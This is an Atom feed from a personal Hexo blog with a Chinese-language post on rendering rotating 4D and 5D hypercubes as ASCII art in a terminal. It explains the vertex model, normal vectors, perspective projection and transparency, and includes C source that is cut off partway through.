<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KYRIOTA</title>
  
  
  <link href="https://kyriota.github.io/atom.xml" rel="self"/>
  
  <link href="https://kyriota.github.io/"/>
  <updated>2021-05-04T15:43:39.977Z</updated>
  <id>https://kyriota.github.io/</id>
  
  <author>
    <name>KYRIOTA</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello Dimension</title>
    <link href="https://kyriota.github.io/2021/04/24/Hello_Dimension/"/>
    <id>https://kyriota.github.io/2021/04/24/Hello_Dimension/</id>
    <published>2021-04-24T09:28:20.000Z</published>
    <updated>2021-05-04T15:43:39.977Z</updated>
    
    <content type="html"><![CDATA[<p>Meet Hypercubes~ O(∩_∩)O</p><p>🦎语言渲染n维立方体至终端，那真是非常amazing啊</p><img src="/images/4Hypercube-transparent.gif" height="200" width="200" /><span id="more"></span><h1 id="Hello-Dimension"><a href="#Hello-Dimension" class="headerlink" title="Hello Dimension"></a>Hello Dimension</h1><p align="right"><small>So all this just to render a cube on your terminal ?</small></p><p>封面gif为超立方体绕xw与xz轴的旋转，至于结果的正确性，我参照了wiki且自认为无误，例如下图就是一些与超立方体相关的图片</p><center><table>    <tr>        <td ><center><img src="/images/HypercubeStructure.gif" width=200 height=200>超立方体解构</center></td>        <td ><center><img src="/images/wikiHypercube.gif" width=200 height=200>超立方体绕xw轴旋转</center></td>    </tr></table></center>不妨先来看看我的代码都渲染出了些什么：<table><thead><tr><th>图像</th><th>说明</th></tr></thead><tbody><tr><td><img src="/images/4HypercubeOpen.gif" width=500 height=500></td><td>此为在<a href="https://kyriota.gitee.io/kyriota/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/">图形学HelloWorld</a>基础上修改的代码，限于模型生成原理与渲染原理写的稀烂而无法拓展到更高的五维，且由于法向量并非实时计算而是手动设置，导致旋转时的”四维面“渲染错误（就是gif中看见明显是个正方体但是却没有正确的打光的一坨吞过来吐回去的东西）</td></tr><tr><td><img src="/images/4Hypercube.gif" width=500 height=500></td><td>后来对模型生成原理与渲染原理大改，引入顶点模型并实时计算法向量，正确渲染出了这个超立方体</td></tr><tr><td><img src="/images/5Hypercube.gif" width=500 height=500></td><td>在四维升五维时又出现了代码通用性的问题，发现五维时存在多处三角形的各顶点几乎位于同一直线的情况，对判断质心与直线关系的方程引入一个很小的Δoffest解决此问题</td></tr></tbody></table><p>最后写了透明材质，为了方便和实际效果没有对透明材质计算光照，透明物体代码比不透明的简单，但确实便利了理解内部结构变化</p><center><table>    <tr>        <td ><center><img src="/images/4Hypercube-transparent.gif" width=200 height=200>透明四维 </center></td>        <td ><center><img src="/images/5Hypercube-transparent.gif" width=200 height=200>透明五维</center></td>    </tr></table></center><div class='spoiler collapsed'>    <div class='spoiler-title'>        对渲染与模型的改进大纲    </div>    <div class='spoiler-content'>        <ul><li><p>三角形：先前的正方体和球体模型都是实际存在于数组中的非常多的点，每个点与屏幕上的点对应，不仅空间占用多，算力跟不上，法向量也是针对正方体和球体的几何性质为其手动安排的，缺乏普适性</p><ul><li>解决：对于正方体，只需要求出正方体的顶点以及顶点之间的位置关系（哪些顶点相邻），即可由此推得三角形、四棱锥等独立的局部图形，这带来的好处有：<ul><li>普适性增强，即使物体不是正方体也能以此方式计算、渲染</li><li>性能提升，维度得以升的更高，计算速度快了亿点点</li><li>可以通过计算局部质心准确区分内外法向量，但是此处的正方体是凸几何体，直接以原点（正方体质心）区分内外法向量也是足够的</li></ul></li></ul></li><li><p>内外法向量：现有一模型的相邻三点确定的平面ABC，如何区分内外法向量？</p><ul><li><p>解决：因为我面对的对象是正方体，所以只要对任意顶点向量加上法向量，将作此偏移后的向量与其对应顶点向量比较模长大小，即可判断内外法向量</p><img src="/images/HelloDimension_外法向量.jpg" width=200 height=200><p>但这样会在凹几何体上有误</p><img src="/images/HelloDimension_全局质心.jpg" width=200 height=200><p>所以普适的做法应是再寻找一个相邻顶点，确定一个四面体，计算此四面体质心，然后以此质心为基准作同样的偏移后的模长比较</p></li></ul></li><li><p>透视投影：人眼观察物体是小孔成像，透视投影，正投影会缺少近大远小的特征，且只有在降维时透视投影才能使高维几何体投影出令人满意的效果（否则就是黏成一坨扭来扭曲，没有大小变化），透视投影的投影矩阵通过一个相似三角形就出来了，点到为止</p></li><li><p>半透明材质：就简不就繁，再精致的透明材质在终端也看不出来，我的做法是不再计算法向量，发现投影到屏幕上的面有几个，该点的alpha就加到几，然后应用下面这个式子把alpha换回 [0,1) 内（整个幂主要是想让曲线平滑一点，去掉也可以）</p>  <center><code>alpha=1-1/(k*alpha+1)^3/2</code></center></li></ul>    </div></div><p>以下是最终的源码，重要参数全部在define或全局变量中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0.6</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;</span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;</span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;</span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;</span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];</span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];</span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];</span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));</span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)</span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)</span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)</span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)</span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])</span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;&#125;&#125;&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);&#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])</span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);&#125;</span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];</span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];&#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;</span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;&#125;&#125;&#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++) <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                    x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                    tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                    y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                    tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                    z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                    xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                    yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];&#125;</span><br><span class="line">                tCenter[<span class="number">0</span>]/=<span class="number">3</span>;tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span 